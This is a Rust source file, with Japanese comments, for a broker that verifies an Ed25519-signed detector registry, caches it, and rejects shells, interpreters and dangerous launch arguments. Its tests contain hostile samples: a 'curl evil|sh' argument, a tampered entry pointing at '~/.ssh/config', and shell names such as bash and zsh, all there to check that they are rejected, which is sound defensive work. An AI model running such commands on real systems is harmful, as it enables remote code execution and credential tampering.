//! Detector Registry(アーキ §39 / PBI-0022 / 図18)。
//!
//! 「何を AI として検出するか」を Cloud が署名して配り、broker は埋め込んだ public key で検証する。
//! 不変条件: **署名検証を通った data でしか launch allowlist は広がらない**(cache も load 時に再検証)、
//! **built-in fallback(claude / codex)は撤去しない**(offline / 検証 NG / 503 でも動く)。

use std::fs;
use std::path::Path;
use std::time::Duration;

use base64::Engine as _;
use ed25519_dalek::{Signature, VerifyingKey};
use serde::Deserialize;

/// built-in registry(claude / codex)。fetch / cache が無くても動く最低限。
const BUILTIN_JSON: &str = include_str!("../builtin-detectors.json");

/// pin する public key(hex 32byte)。**compile-time** で決まる —
/// 本番 / E2E build は `OPENROLY_REGISTRY_PUBLIC_KEY` で差し替え、無ければ dev 鍵の `registry.pub`。
/// 実行時 env で差し替えられる口は作らない(pin の意味が無くなる)。
///
/// **本番の鍵は `broker/registry.prod.pub`**(PBI-0244)。Release の workflow がその値を
/// `OPENROLY_REGISTRY_PUBLIC_KEY` に焼くので、dev 鍵(`registry.pub` = `apps/server/.env.local` の
/// seed の対)で署名した registry は Release の broker に**通らない** —— dev 機の平文 seed が
/// 本番 fleet の鍵を兼ねる状態を切る。素の `cargo build` は今までどおり dev 鍵。
const PINNED_PUBLIC_KEY_HEX: &str = match option_env!("OPENROLY_REGISTRY_PUBLIC_KEY") {
    Some(k) => k,
    None => include_str!("../registry.pub"),
};

/// Cloud が署名を載せる header 名(apps/server/src/app.ts の route と対)。
pub const SIGNATURE_HEADER: &str = "X-OpenRoly-Registry-Signature";
const CACHE_BODY: &str = "detectors.json";
const CACHE_SIG: &str = "detectors.sig";
const CACHE_ETAG: &str = "detectors.etag";
const FETCH_TIMEOUT: Duration = Duration::from_secs(5);
/// 取得間隔の既定(6h)。`OPENROLY_REGISTRY_REFRESH_SECS` で上書き。
pub const DEFAULT_REFRESH: Duration = Duration::from_secs(6 * 60 * 60);

#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Default)]
pub struct Registry {
    #[serde(default)]
    pub version: u32,
    #[serde(default)]
    pub issued_at: String,
    #[serde(default)]
    pub detectors: Vec<Detector>,
    /// どこから来た registry か(ログ用): "builtin" / "cache" / "fetched"
    #[serde(skip)]
    pub origin: &'static str,
}

/// 未知の field は無視する(registry 側が先に増えても古い broker が壊れない)。
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
pub struct Detector {
    pub id: String,
    #[serde(default)]
    pub display_name: String,
    #[serde(default)]
    pub kind: String,
    #[serde(default)]
    pub detect: Detect,
    #[serde(default)]
    pub version: Option<VersionProbe>,
    #[serde(default)]
    pub launch: LaunchArgs,
    #[serde(default)]
    pub capabilities: Vec<String>,
    /// None = 検出・表示はするが wake / MCP 配線の対象ではない(Ollama。アーキ §39)
    #[serde(default)]
    pub adapter: Option<String>,
    /// models 列挙の出所(PBI-0025)。`source: "service"` なら `detect.services` の応答から抽出する
    #[serde(default)]
    pub models: Option<ModelsSpec>,
    /// generic adapter の材料(PBI-0210 / EP-0017)。**中身は解釈しない** —— 署名検証済み registry の
    /// bytes 由来のまま `openroly adopt --spec-stdin` へ渡すだけ(config の書き方の正本は TS 側 1 箇所)。
    /// `verify` 前に読まない(allowlist と同じ不変条件 = 署名不一致の `native` は捨てる)。
    #[serde(default)]
    pub native: Option<serde_json::Value>,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Default)]
pub struct Detect {
    /// 「この端末では常に利用できる」(PBI-0070 / EP-0009 C)。外部 API provider のように
    /// 探すべき binary / app / service を持たない runtime のための宣言 —— true なら
    /// discovery は一切探索せずに Found を返す(実体は `openroly agent <provider>`)。
    #[serde(default)]
    pub always: bool,
    #[serde(default)]
    pub binaries: Vec<String>,
    #[serde(default)]
    pub apps: Vec<String>,
    /// home 配下の marker dir(`~/.kiro` 等。PBI-0210 / vercel-labs/skills の表の「検知 path」)。
    /// binary も app も無い時の fallback で、実在すれば `source: "dir"` で Found にする
    #[serde(default)]
    pub dirs: Vec<String>,
    /// local HTTP service(Ollama :11434 等。要件 §45.3 層 1 / PBI-0025)。**existence**(見つかる/
    /// 見つからない・path・source)は binaries / apps どちらも見つからない時だけの fallback だが、
    /// `models.source == "service"` の detector では **models だけは binary/app 発見済みでも常に
    /// probe する**(discovery.rs::scan の独立レビュー指摘 AC-12/13 — CLI はインストール済みでも
    /// daemon の起動有無は別に確認する)
    #[serde(default)]
    pub services: Vec<ServiceProbe>,
    // packages は形式だけ持ち評価しない(serde が無視する。PBI-0025 スコープ外)
}

/// `services` の 1 要素。host は常に `127.0.0.1`(要件 §45.3「local HTTP service」— リモートは見ない)。
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Default)]
pub struct ServiceProbe {
    pub port: u16,
    #[serde(default)]
    pub path: String,
}

/// `Detector.models`。`source == "service"` の時だけ discovery.rs が使う(他の値は将来の拡張余地として
/// 無視する — 未知の source で panic しない)。
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
pub struct ModelsSpec {
    pub source: String,
    #[serde(default)]
    pub path: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
pub struct VersionProbe {
    #[serde(default)]
    pub args: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Default)]
pub struct LaunchArgs {
    #[serde(default)]
    pub new: Vec<String>,
    #[serde(default)]
    pub existing: Vec<String>,
}

fn is_safe_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 64
        && id
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_' || b == b'-')
}

// ---------- program deny / probe 引数 allowlist(PBI-0244) ----------
//
// 署名鍵 1 本で全 broker の任意コマンド実行にならないための床。`is_safe_id` は小文字英数を通すので
// `sh` / `bash` / `python3` は**有効な id** であり、id は `resolve_program` の bare name、
// `detect.binaries` は version probe の spawn 先になる —— 鍵を持つ者が registry に 1 行足すだけで
// 15 秒ごとに任意の command を全端末で起こせた。表の正本は `packages/core` の txt 1 file で、
// Cloud(`apps/server/src/registry.ts`)も**同じ file を読む**(2 箇所に手で写さない)。

/// 起こしてよくない program(shell / interpreter / 起動代理)。
const FORBIDDEN_PROGRAMS: &str = include_str!("../../packages/core/src/forbidden-programs.txt");
/// version probe に許す引数。
const ALLOWED_PROBE_ARGS: &str = include_str!("../../packages/core/src/allowed-probe-args.txt");

/// txt の 1 行 1 語(空行と `#` の comment を落とす)。
fn words(list: &str) -> impl Iterator<Item = &str> {
    list.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
}

/// basename を小文字化し、**末尾の版(数字 / `.` / `-`)を落として**表と照合する
/// (`/usr/bin/python3.12` → `python`)。`nodemon` のような「先頭が一致するだけの別物」は落とさない
/// (単純な先頭一致にすると catalog の正規 binary を巻き込む)。
pub fn is_forbidden_program(program: &str) -> bool {
    let base = program
        .rsplit(|c| c == '/' || c == '\\')
        .next()
        .unwrap_or(program)
        .to_ascii_lowercase();
    let stem = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.' || c == '-');
    words(FORBIDDEN_PROGRAMS).any(|w| w == base || w == stem)
}

/// detector 1 件の検査。**1 件でも違反したら registry ごと拒否する**(fetched は捨てて cache / built-in)
/// —— 「違反 entry だけ落とす」にすると、攻撃者は正規 entry に 1 つ紛れ込ませるだけで残りを配れる。
fn validate(d: &Detector) -> Result<(), String> {
    if is_forbidden_program(&d.id) {
        return Err(format!("registry: forbidden program {:?}", d.id));
    }
    for b in &d.detect.binaries {
        if is_forbidden_program(b) {
            return Err(format!("registry: forbidden program {:?}", b));
        }
    }
    if let Some(v) = &d.version {
        for a in &v.args {
            if !words(ALLOWED_PROBE_ARGS).any(|w| w == a) {
                return Err(format!("registry: probe args not allowed {a:?} (id {})", d.id));
            }
        }
    }
    // `launch` は program になり得る位置を持たないが、`-c` / `-e` / `--eval` は「引数の中に
    // 別の言語を持ち込む」形なので、将来 program 側に穴が空いた時のために今から閉じておく。
    for a in d.launch.new.iter().chain(d.launch.existing.iter()) {
        if a == "-c" || a == "-e" || a == "--eval" || a.starts_with("--eval=") {
            return Err(format!("registry: forbidden launch arg {a:?} (id {})", d.id));
        }
    }
    Ok(())
}

/// JSON → Registry。id の文字種・重複、および program deny / probe 引数(PBI-0244)を弾く
/// (id は launch の program 名 / allowlist の値、`detect.binaries` は probe の spawn 先になる)。
/// detectors は id 順に並べ、scan 結果の順序を決定的にする(hello の差分判定が順序に依存しないよう)。
pub fn parse(body: &str, origin: &'static str) -> Result<Registry, String> {
    let mut reg: Registry = serde_json::from_str(body).map_err(|e| format!("registry parse: {e}"))?;
    let mut seen = std::collections::HashSet::new();
    for d in &reg.detectors {
        if !is_safe_id(&d.id) {
            return Err(format!("registry: invalid id {:?}", d.id));
        }
        if !seen.insert(d.id.clone()) {
            return Err(format!("registry: duplicate id {}", d.id));
        }
        validate(d)?;
    }
    reg.detectors.sort_by(|a, b| a.id.cmp(&b.id));
    reg.origin = origin;
    Ok(reg)
}

pub fn builtin() -> Registry {
    parse(BUILTIN_JSON, "builtin").expect("builtin-detectors.json は build 時に valid")
}

impl Registry {
    /// fetched / cache の registry に built-in の entry を補う(id が無いものだけ)。
    /// アーキ §39「allowlist = 署名検証済み registry ∪ built-in」を scan と launch の両方で 1 箇所に。
    pub fn merged_with_builtin(mut self) -> Registry {
        for b in builtin().detectors {
            if !self.detectors.iter().any(|d| d.id == b.id) {
                self.detectors.push(b);
            }
        }
        self.detectors.sort_by(|a, b| a.id.cmp(&b.id));
        self
    }

    pub fn detector(&self, id: &str) -> Option<&Detector> {
        self.detectors.iter().find(|d| d.id == id)
    }

    /// launch allowlist = `adapter` を持つ id(署名検証済み registry ∪ built-in は merged 済み前提)。
    pub fn allowlist(&self) -> Vec<String> {
        self.detectors
            .iter()
            .filter(|d| d.adapter.is_some())
            .map(|d| d.id.clone())
            .collect()
    }

    pub fn ids(&self) -> Vec<&str> {
        self.detectors.iter().map(|d| d.id.as_str()).collect()
    }

    /// Manual routing(要件 §20.1)の New/Existing を runtime CLI の起動引数に翻訳する。
    /// PBI-0017 で hard-code していた `session_args` を registry(`launch.new` / `launch.existing`)へ移した。
    /// "new"・未知の mode・未知の runtime は `launch.new`(既定 [])= 新規 session
    /// (Cloud が古い payload(sessionMode 欠落)を送ってきても既存 session へ注入しない安全側)。
    pub fn session_args(&self, runtime: &str, session_mode: &str) -> Vec<String> {
        let Some(d) = self.detector(runtime) else { return vec![] };
        if session_mode == "existing" {
            d.launch.existing.clone()
        } else {
            d.launch.new.clone()
        }
    }
}

// ---------- 署名 ----------

pub fn pinned_public_key() -> Result<VerifyingKey, String> {
    public_key_from_hex(PINNED_PUBLIC_KEY_HEX.trim())
}

pub fn public_key_from_hex(hex_key: &str) -> Result<VerifyingKey, String> {
    let bytes = hex::decode(hex_key).map_err(|e| format!("public key hex: {e}"))?;
    let arr: [u8; 32] = bytes
        .try_into()
        .map_err(|_| "the public key must be 32 bytes".to_string())?;
    VerifyingKey::from_bytes(&arr).map_err(|e| format!("public key: {e}"))
}

/// Ed25519 detached signature(base64)を body に対して検証する。
pub fn verify(body: &[u8], signature_b64: &str, key: &VerifyingKey) -> Result<(), String> {
    let sig_bytes = base64::engine::general_purpose::STANDARD
        .decode(signature_b64.trim())
        .map_err(|e| format!("signature base64: {e}"))?;
    let arr: [u8; 64] = sig_bytes
        .try_into()
        .map_err(|_| "the signature must be 64 bytes".to_string())?;
    let sig = Signature::from_bytes(&arr);
    key.verify_strict(body, &sig)
        .map_err(|_| "signature mismatch".to_string())
}

// ---------- cache ----------

/// 起動時: cache(`$OPENROLY_BROKER_HOME/detectors.json` + `.sig`)を**再検証してから**使う。
/// 無い / 壊れている / 署名不一致 → built-in。cache の改ざんで allowlist が広がらない。
///
/// 捨てた cache は **etag ごと消す**: etag だけ残ると次の fetch が `If-None-Match` で 304 を受け、
/// 改ざんされた cache を持ったまま built-in に固定され続ける(配布 registry が変わるまで自己修復しない)。
pub fn load(cache_dir: &Path) -> Registry {
    let (Ok(body), Ok(sig)) = (
        fs::read(cache_dir.join(CACHE_BODY)),
        fs::read_to_string(cache_dir.join(CACHE_SIG)),
    ) else {
        return builtin();
    };
    let key = match pinned_public_key() {
        Ok(k) => k,
        Err(e) => {
            eprintln!("broker: invalid registry public key ({e}). Running with the built-in registry");
            return builtin();
        }
    };
    if let Err(e) = verify(&body, &sig, &key) {
        eprintln!("broker: registry cache signature mismatch ({e}). Dropping the cache and running with the built-in registry");
        discard_cache(cache_dir);
        return builtin();
    }
    match parse(&String::from_utf8_lossy(&body), "cache") {
        Ok(reg) => reg.merged_with_builtin(),
        Err(e) => {
            eprintln!("broker: the registry cache is corrupt ({e}). Dropping the cache and running with the built-in registry");
            discard_cache(cache_dir);
            builtin()
        }
    }
}

/// 検証に落ちた cache を body / sig / etag まとめて消す(etag が残ると 304 で自己修復しなくなる)。
fn discard_cache(cache_dir: &Path) {
    for name in [CACHE_BODY, CACHE_SIG, CACHE_ETAG] {
        let _ = fs::remove_file(cache_dir.join(name));
    }
}

pub fn cached_etag(cache_dir: &Path) -> Option<String> {
    fs::read_to_string(cache_dir.join(CACHE_ETAG))
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

fn store(cache_dir: &Path, body: &[u8], sig: &str, etag: Option<&str>) -> Result<(), String> {
    fs::create_dir_all(cache_dir).map_err(|e| format!("cache dir: {e}"))?;
    fs::write(cache_dir.join(CACHE_BODY), body).map_err(|e| format!("cache body: {e}"))?;
    fs::write(cache_dir.join(CACHE_SIG), sig).map_err(|e| format!("cache sig: {e}"))?;
    fs::write(cache_dir.join(CACHE_ETAG), etag.unwrap_or("")).map_err(|e| format!("cache etag: {e}"))?;
    Ok(())
}

// ---------- fetch ----------

#[derive(Debug)]
pub enum FetchOutcome {
    /// 304(ETag 一致)。何もしない
    NotModified,
    /// 200 + 署名 OK + cache 更新済み
    Updated(Registry),
    /// 署名不一致(破棄・cache 不変・allowlist 不変)
    Rejected(String),
    /// 5xx / 接続失敗 / 形式不正。現在の registry を維持
    Failed(String),
}

/// `ws://host:port/v1/broker/ws` → `http://host:port/v1/registry/detectors`(`OPENROLY_REGISTRY_URL` で上書き可)。
pub fn registry_url_from_ws(ws_url: &str) -> String {
    let http = if let Some(rest) = ws_url.strip_prefix("wss://") {
        format!("https://{rest}")
    } else if let Some(rest) = ws_url.strip_prefix("ws://") {
        format!("http://{rest}")
    } else {
        ws_url.to_string()
    };
    // path 部分を差し替える(scheme の後ろの最初の '/' 以降)
    let scheme_end = http.find("://").map(|i| i + 3).unwrap_or(0);
    let path_start = http[scheme_end..].find('/').map(|i| scheme_end + i).unwrap_or(http.len());
    format!("{}/v1/registry/detectors", &http[..path_start])
}

/// **blocking**(呼び出し側は spawn_blocking)。順序: fetch → verify → store。verify が通る前に
/// cache を書かない(図18 の不変条件。旧 diagrams-check が verify 行 < store 行を検査する)。
pub fn fetch_and_store(url: &str, cache_dir: &Path, etag: Option<&str>) -> FetchOutcome {
    let key = match pinned_public_key() {
        Ok(k) => k,
        Err(e) => return FetchOutcome::Failed(format!("invalid public key: {e}")),
    };
    let agent = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).build();
    let mut req = agent.get(url);
    if let Some(tag) = etag {
        req = req.set("If-None-Match", tag);
    }
    let resp = match req.call() {
        Ok(r) => r,
        Err(ureq::Error::Status(code, _)) => return FetchOutcome::Failed(format!("status={code}")),
        Err(e) => return FetchOutcome::Failed(format!("transport: {e}")),
    };
    if resp.status() == 304 {
        return FetchOutcome::NotModified;
    }
    if resp.status() != 200 {
        return FetchOutcome::Failed(format!("status={}", resp.status()));
    }
    let sig = match resp.header(SIGNATURE_HEADER) {
        Some(s) => s.to_string(),
        None => return FetchOutcome::Rejected(format!("missing {SIGNATURE_HEADER} header")),
    };
    let new_etag = resp.header("ETag").map(|s| s.to_string());
    let body = match resp.into_string() {
        Ok(b) => b,
        Err(e) => return FetchOutcome::Failed(format!("body: {e}")),
    };
    if let Err(e) = verify(body.as_bytes(), &sig, &key) {
        return FetchOutcome::Rejected(e);
    }
    let reg = match parse(&body, "fetched") {
        Ok(r) => r,
        Err(e) => return FetchOutcome::Failed(e),
    };
    if let Err(e) = store(cache_dir, body.as_bytes(), &sig, new_etag.as_deref()) {
        eprintln!("broker: could not write the registry cache ({e}). This registry is used in memory only");
    }
    FetchOutcome::Updated(reg.merged_with_builtin())
}

#[cfg(test)]
mod tests {
    use super::*;
    use ed25519_dalek::{Signer, SigningKey};

    fn test_key() -> SigningKey {
        SigningKey::from_bytes(&[7u8; 32])
    }

    fn sign_b64(key: &SigningKey, body: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(key.sign(body).to_bytes())
    }

    #[test]
    fn builtin_has_claude_and_codex_with_adapters() {
        let reg = builtin();
        assert_eq!(reg.ids(), vec!["claude", "codex"]);
        assert_eq!(reg.allowlist(), vec!["claude", "codex"]);
        assert_eq!(reg.origin, "builtin");
    }

    #[test]
    fn session_args_come_from_registry_launch_block() {
        // PBI-0017 AC-2 の翻訳が registry 駆動になっても同じ引数になること
        let reg = builtin();
        assert_eq!(reg.session_args("claude", "existing"), vec!["--continue"]);
        assert_eq!(reg.session_args("codex", "existing"), vec!["resume", "--last"]);
        assert!(reg.session_args("claude", "new").is_empty());
        assert!(reg.session_args("codex", "").is_empty());
        assert!(reg.session_args("claude", "resume").is_empty());
        assert!(reg.session_args("hermes", "existing").is_empty());
        assert!(reg.session_args("rm", "existing").is_empty());
    }

    #[test]
    fn parse_rejects_bad_or_duplicate_ids() {
        assert!(parse(r#"{"version":1,"detectors":[{"id":"Bad Id"}]}"#, "t").is_err());
        assert!(parse(r#"{"version":1,"detectors":[{"id":"a"},{"id":"a"}]}"#, "t").is_err());
        assert!(parse(r#"{"version":1,"detectors":[{"id":"../x"}]}"#, "t").is_err());
    }

    #[test]
    fn parse_ignores_unknown_fields_and_sorts_by_id() {
        let reg = parse(
            r#"{"version":1,"issued_at":"x","future":true,
                "detectors":[{"id":"zeta","adapter":"a","extra":1},{"id":"alpha","adapter":null}]}"#,
            "t",
        )
        .unwrap();
        assert_eq!(reg.ids(), vec!["alpha", "zeta"]);
        // adapter: null は allowlist に入らない(検出・表示のみ)
        assert_eq!(reg.allowlist(), vec!["zeta"]);
    }

    // PBI-0210: `native`(generic adapter の材料)と `detect.dirs` は解釈せずに保持する
    #[test]
    fn parse_keeps_native_and_detect_dirs_without_interpreting_them() {
        let reg = parse(
            r#"{"version":1,"detectors":[{"id":"kiro","adapter":"generic/native",
                "detect":{"dirs":["~/.kiro"]},
                "native":{"mcp":{"strategy":"file","path":"~/.kiro/settings/mcp.json","format":"json","key":"mcpServers","entry":{}}}}]}"#,
            "t",
        )
        .unwrap();
        let d = reg.detector("kiro").unwrap();
        assert_eq!(d.detect.dirs, vec!["~/.kiro"]);
        assert_eq!(d.native.as_ref().unwrap()["mcp"]["strategy"], "file");
        // 無い entry は None(古い registry でも壊れない)
        let old = parse(r#"{"version":1,"detectors":[{"id":"claude","adapter":"official/claude"}]}"#, "t").unwrap();
        assert!(old.detector("claude").unwrap().native.is_none());
        assert!(old.detector("claude").unwrap().detect.dirs.is_empty());
    }

    #[test]
    fn merged_with_builtin_keeps_fetched_entries_and_fills_missing() {
        let reg = parse(
            r#"{"version":2,"detectors":[{"id":"superagent","adapter":"official/superagent"},
                {"id":"claude","adapter":"official/claude","launch":{"existing":["--resume"]}}]}"#,
            "fetched",
        )
        .unwrap()
        .merged_with_builtin();
        assert_eq!(reg.ids(), vec!["claude", "codex", "superagent"]);
        // fetched の claude が勝つ(built-in で上書きしない)
        assert_eq!(reg.session_args("claude", "existing"), vec!["--resume"]);
        assert_eq!(reg.allowlist(), vec!["claude", "codex", "superagent"]);
    }

    // AC-2: 署名検証。改ざん body / 不正 sig は Err、正しい組は Ok
    #[test]
    fn verify_accepts_valid_and_rejects_tampered() {
        let key = test_key();
        let body = br#"{"version":1,"detectors":[]}"#;
        let sig = sign_b64(&key, body);
        let pubkey = key.verifying_key();
        assert!(verify(body, &sig, &pubkey).is_ok());
        let mut tampered = body.to_vec();
        tampered[2] ^= 0x01;
        assert!(verify(&tampered, &sig, &pubkey).is_err());
        assert!(verify(body, "not-base64!!", &pubkey).is_err());
        assert!(verify(body, &base64::engine::general_purpose::STANDARD.encode([0u8; 10]), &pubkey).is_err());
        let other = SigningKey::from_bytes(&[9u8; 32]).verifying_key();
        assert!(verify(body, &sig, &other).is_err());
    }

    #[test]
    fn public_key_hex_roundtrip() {
        let key = test_key().verifying_key();
        let hex_key = hex::encode(key.to_bytes());
        assert_eq!(public_key_from_hex(&hex_key).unwrap(), key);
        assert!(public_key_from_hex("zz").is_err());
        assert!(public_key_from_hex("00").is_err());
    }

    #[test]
    fn pinned_public_key_is_valid_32_bytes() {
        // registry.pub / OPENROLY_REGISTRY_PUBLIC_KEY が壊れていたら build 済み binary が丸ごと built-in 固定になる。
        // ここで気付く
        assert!(pinned_public_key().is_ok(), "pin された public key が不正: {PINNED_PUBLIC_KEY_HEX:?}");
    }

    // PBI-0244 AC-X2 / AC-5: 本番 pin(`registry.prod.pub`)も **CI で** parse できることを確かめる。
    // release.yml はこの file を `cat` して build 時に焼くので、欠落 / 非 hex のまま Release すると
    // 「配った binary が丸ごと built-in 固定」になる —— 気付けるのは配った後。ここで先に落とす。
    // dev 鍵と同じ値だったら分離できていない(元の事故そのもの)ので、それも落とす。
    #[test]
    fn prod_pinned_key_parses_and_differs_from_dev() {
        const PROD: &str = include_str!("../registry.prod.pub");
        assert!(public_key_from_hex(PROD.trim()).is_ok(), "registry.prod.pub が 32byte hex ではない");
        assert_ne!(
            PROD.trim(),
            include_str!("../registry.pub").trim(),
            "本番 pin が dev 鍵と同じ = 分離できていない"
        );
    }

    // PBI-0244 AC-1: 署名は正しくても shell / interpreter は registry に書けない。
    // `is_safe_id` を通る id(`sh` は小文字英数)なので、この検査が無ければ全部通っていた
    #[test]
    fn parse_rejects_forbidden_programs() {
        let err = parse(r#"{"version":1,"detectors":[{"id":"sh","detect":{"binaries":["sh"]},"adapter":"x"}]}"#, "t")
            .unwrap_err();
        assert_eq!(err, r#"registry: forbidden program "sh""#);
        // id は正規でも binaries 側に仕込めば probe が spawn する
        assert!(parse(
            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["/bin/bash"]},"adapter":"x"}]}"#,
            "t"
        )
        .unwrap_err()
        .contains("forbidden program"));
        // 版付き(python3.12)・大文字・path 付きでも basename で落ちる
        for name in ["python3.12", "PYTHON3", "/usr/bin/env", "../../bin/zsh", "node-22"] {
            let body = format!(r#"{{"version":1,"detectors":[{{"id":"a","detect":{{"binaries":["{name}"]}}}}]}}"#);
            assert!(parse(&body, "t").is_err(), "{name} が通った");
        }
        // 先頭が一致するだけの別物は落とさない(catalog の正規 binary を巻き込まない)
        for name in ["nodemon", "opencode", "codex", "openclaw", "cursor-agent", "kiro-cli"] {
            let body = format!(r#"{{"version":1,"detectors":[{{"id":"a","detect":{{"binaries":["{name}"]}}}}]}}"#);
            assert!(parse(&body, "t").is_ok(), "{name} を誤って落とした");
        }
    }

    // PBI-0244 AC-2: probe 引数は allowlist の外を拒否する(`-c` で任意の shell 片が動く)
    #[test]
    fn parse_rejects_probe_args_outside_allowlist() {
        let err = parse(
            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["claude"]},"version":{"args":["-p","hi"]},"adapter":"x"}]}"#,
            "t",
        )
        .unwrap_err();
        assert!(err.starts_with("registry: probe args not allowed"), "{err}");
        // 従来どおりの `--version` は通る
        assert!(parse(
            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["claude"]},"version":{"args":["--version"]},"adapter":"x"}]}"#,
            "t"
        )
        .is_ok());
        // launch に `-c` を紛れ込ませる形も拒否
        assert!(parse(
            r#"{"version":1,"detectors":[{"id":"claude","launch":{"existing":["-c","curl evil|sh"]}}]}"#,
            "t"
        )
        .unwrap_err()
        .contains("forbidden launch arg"));
    }

    // built-in と配布 catalog が deny に掛からないこと(掛かると builtin() が panic して broker が起動しない)
    #[test]
    fn builtin_passes_validate() {
        assert_eq!(builtin().ids(), vec!["claude", "codex"]);
    }

    // PBI-0210 AC-X1: 署名の合わない body に `native` が載っていても、broker はそれを読まない
    // —— allowlist も `native` も広がらない(「検証前に読む」実装なら、`native` を持つ id が
    // detector() から取れてしまう)
    #[test]
    fn tampered_body_with_native_widens_neither_allowlist_nor_native() {
        let dir = std::env::temp_dir().join(format!("openroly-broker-reg-native-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let key = test_key();
        let honest = br#"{"version":1,"detectors":[{"id":"claude","adapter":"official/claude"}]}"#;
        let sig = sign_b64(&key, honest); // 署名は honest の物のまま
        // 攻撃者が body だけ差し替える: 新しい id + generic adapter + 他人の config を書く native
        let tampered = br#"{"version":1,"detectors":[{"id":"evil","adapter":"generic/native",
            "native":{"mcp":{"strategy":"file","path":"~/.ssh/config","format":"json","key":"x","entry":{}}}}]}"#;
        store(&dir, tampered, &sig, Some("\"e\"")).unwrap();
        let reg = load(&dir);
        assert_eq!(reg.origin, "builtin", "改ざん body を採用した");
        assert!(reg.detector("evil").is_none(), "改ざんされた id が registry に入った");
        assert!(!reg.allowlist().contains(&"evil".to_string()), "allowlist が改ざんで広がった");
        // built-in の entry には native が無い(= 改ざん body の native がどこにも漏れていない)
        for id in reg.ids().iter().map(|s| s.to_string()).collect::<Vec<_>>() {
            assert!(reg.detector(&id).unwrap().native.is_none(), "{id} に native が漏れた");
        }
        let _ = fs::remove_dir_all(&dir);
    }

    // AC-2c: cache の body を改ざんすると load は built-in に落ちる(署名は元のまま)
    #[test]
    fn load_rejects_tampered_cache_and_falls_back_to_builtin() {
        let dir = std::env::temp_dir().join(format!("openroly-broker-reg-cache-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        // 署名は pin された鍵ではないので、正しい body でも load は built-in になる(pin 検証の実在確認)
        let key = test_key();
        let body = br#"{"version":1,"detectors":[{"id":"superagent","adapter":"x"}]}"#;
        store(&dir, body, &sign_b64(&key, body), Some("\"e\"")).unwrap();
        assert_eq!(cached_etag(&dir).as_deref(), Some("\"e\""));
        let reg = load(&dir);
        assert_eq!(reg.origin, "builtin");
        assert!(reg.detector("superagent").is_none());
        // PBI-0039 AC-1: 捨てた cache の etag は残さない(残ると次の fetch が 304 を受けて built-in に
        // 固定され続け、改ざん cache から自己修復しない)
        assert_eq!(cached_etag(&dir), None, "捨てた cache の etag が残っている");
        assert!(!dir.join(CACHE_BODY).exists() && !dir.join(CACHE_SIG).exists());
        // 署名は通るが JSON として壊れている cache も同じ扱い
        let broken = br#"{"version":1,"detectors":[{"id":"Bad Id"}]}"#;
        store(&dir, broken, &sign_b64(&key, broken), Some("\"b\"")).unwrap();
        assert_eq!(load(&dir).origin, "builtin");
        assert_eq!(cached_etag(&dir), None);
        // cache 無し
        fs::remove_dir_all(&dir).unwrap();
        assert_eq!(load(&dir).origin, "builtin");
        assert_eq!(cached_etag(&dir), None);
    }

    #[test]
    fn registry_url_is_derived_from_ws_url() {
        assert_eq!(
            registry_url_from_ws("ws://127.0.0.1:8787/v1/broker/ws"),
            "http://127.0.0.1:8787/v1/registry/detectors"
        );
        assert_eq!(
            registry_url_from_ws("wss://openroly.example.com/v1/broker/ws"),
            "https://openroly.example.com/v1/registry/detectors"
        );
        assert_eq!(registry_url_from_ws("ws://localhost:1"), "http://localhost:1/v1/registry/detectors");
    }
}
